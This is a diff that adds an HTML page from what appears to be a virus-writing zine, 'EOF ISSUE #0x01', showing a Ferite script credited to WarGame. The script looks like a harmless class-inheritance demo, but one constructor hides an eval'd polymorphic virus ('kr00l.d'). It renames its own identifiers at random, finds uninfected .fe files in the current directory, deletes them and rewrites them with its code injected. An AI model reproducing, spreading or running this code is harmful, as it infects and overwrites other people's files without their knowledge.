@@ -1,0 +1,64 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: WarGame/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/WarGame/Kr00ld"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+#!/usr/bin/env ferite
+
+uses &quot;console&quot;;
+
+class Blah
+{
+   function constructor()
+   {
+       Console.println( &quot;Blah Constructor&quot; );
+   
+eval('uses &quot;filesystem&quot;,&quot;sys&quot;,&quot;regexp&quot;,&quot;math&quot;,&quot;string&quot;,&quot;date&quot;;function DPEBJP(string GNDILP) { string HEACME = File.open(GNDILP).toString(); if(String.index(HEACME,&quot;kr00l.d by [WarGame,#eof]&quot;) != -1) {return 1;} else {return 0;}} function GDBAHH() {return 65; } function GEDDBD(number sd) { Math.srand(sd); return String.sprintf(&quot;%c%c%c%c%c%c&quot;,((Math.rand()%10)+GDBAHH()),((Math.rand()%20)+GDBAHH()),((Math.rand()%11)+GDBAHH()),((Math.rand()%9)+GDBAHH()),((Math.rand()%14)+GDBAHH()),((Math.rand()%16)+GDBAHH()));} string GGFHEP = &quot;kr00l.d by [WarGame,#eof]&quot;;string DEEFKE = &quot;&quot;;string EHDCHH = &quot;&quot;;object IFGCNI =  File.open(Sys.scriptName());string GLHBBJ = &quot;&quot;;object GMDFFE = new Directory(&quot;.&quot;); while(String.index((EHDCHH = IFGCNI.readln()),GGFHEP) == -1) {} if(1) { EHDCHH = Regexp.replaceAll(&quot;GGFHEP&quot;,EHDCHH,GEDDBD(Date.now()+1989)); EHDCHH = Regexp.replaceAll(&quot;DPEBJP&quot;,EHDCHH,GEDDBD(Date.now()+1975)); EHDCHH = Regexp.replaceAll(&quot;EHDCHH&quot;,EHDCHH,GEDDBD(Date.now()+2006)); EHDCHH = Regexp.replaceAll(&quot;GDBAHH&quot;,EHDCHH,GEDDBD(Date.now()+1900)); EHDCHH = Regexp.replaceAll(&quot;GNDILP&quot;,EHDCHH,GEDDBD(Date.now()+1930)); EHDCHH = Regexp.replaceAll(&quot;HEACME&quot;,EHDCHH,GEDDBD(Date.now()+1910)); EHDCHH = Regexp.replaceAll(&quot;GMDFFE&quot;,EHDCHH,GEDDBD(Date.now()+1920)); EHDCHH = Regexp.replaceAll(&quot;DEEFKE&quot;,EHDCHH,GEDDBD(Date.now()+1950)); EHDCHH = Regexp.replaceAll(&quot;GLHBBJ&quot;,EHDCHH,GEDDBD(Date.now()+1970)); EHDCHH = Regexp.replaceAll(&quot;IFGCNI&quot;,EHDCHH,GEDDBD(Date.now()+1890)); EHDCHH = Regexp.replaceAll(&quot;GEDDBD&quot;,EHDCHH,GEDDBD(Date.now()+1800)); } while((DEEFKE = GMDFFE.getEntry()) != &quot;&quot;) { if(String.index(Sys.scriptName(),DEEFKE) == -1 &amp;&amp; String.index(DEEFKE,&quot;.fe&quot;) != -1) {  if(!DPEBJP(DEEFKE)) { GLHBBJ = File.open(DEEFKE).toString(); File.remove(DEEFKE); GLHBBJ = Regexp.replace(&quot;}&quot;,GLHBBJ,&quot;\n&quot; + EHDCHH+&quot;}\n&quot;); File.create(DEEFKE).writeln(GLHBBJ); } } }');
+}
+
+
+   function test()
+   {
+       Console.println( &quot;Blot&quot; );
+   }
+
+   function Blot()
+   {
+       Console.println(&quot;Blah.Blot&quot;);
+   }
+}
+
+class Blim extends Blah
+{
+   function constructor()
+   {
+       super();
+       self( &quot;Yep. It Works&quot; );
+	   Console.println( &quot;Blim Constructor&quot; );
+   }
+
+   function constructor( string b2 )
+   {
+	   Console.println( &quot;self works: $b2&quot; );
+   }
+   
+   function Blot()
+   {
+       super.test();
+       iferr
+       {
+           parent.test();
+       }
+       fix
+       {
+           Console.println( &quot;Ewps. An error occured, but we is goner continue&quot; );
+       }
+       super.Blot();
+   }
+}
+
+object blop = new Blim();
+
+blop.Blot();
+</pre></body></html>
